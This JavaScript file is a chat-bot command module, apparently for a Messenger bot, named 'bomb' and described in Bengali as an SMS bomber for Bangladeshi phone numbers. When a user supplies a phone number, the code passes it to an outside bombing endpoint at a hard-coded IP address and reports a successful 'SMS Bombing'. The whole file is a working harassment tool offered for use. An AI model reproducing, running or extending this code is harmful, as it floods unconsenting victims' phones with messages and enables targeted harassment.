module.exports.config = {
  name: "bomb",
  version: "1.0.0",
  hasPermssion: 0, //DONT CHANGE THIS MODIFIER CREDIT TANVIR-TAMIM
  credits: "TANVIR-TAMIM",
  description: "এসএমএস বোম্বার, শুধুমাত্র বাংলাদেশি নাম্বারের জন্য প্রযোজ্য",
  commandCategory: "Tools",
  usages: `Write BD Phone Number - ⚠️\n\n» Example :\n${global.config.PREFIX}bomb 017526xxxxx`,
  cooldowns: 15,
  dependencies: {"axios" : ""}
};
module.exports.run = async({api, event, args}) => {
	const axios = require('axios');
	if (args[0]) {
  api.sendMessage(`Your Request Is Being Processing ✅\n\nPlease Wait Few Minutes ☺️`, event.threadID, (err, info) => setTimeout(() => { api.unsendMessage(info.messageID) }, 90000));
	let i1 = (args[0]) //sms bomb api // fixed by TANVIR-TAMIM // dont harm this //
	const res = await axios.get(`http://206.189.134.221/wordpress/wp-content/uploads/bmb/${i1}`);
	return api.sendMessage(`Successfully Completed SMS Bombings - ✅`, event.threadID, event.messageID)
} //modifi credit - fixed by TANVIR-TAMIM
else if (args.join() == "") { 
	  return api.sendMessage(`Please Write Phone Number - ⚠️\n\n» Example :\n${global.config.PREFIX}bomb 017526xxxxx`, event.threadID, event.messageID)}
  }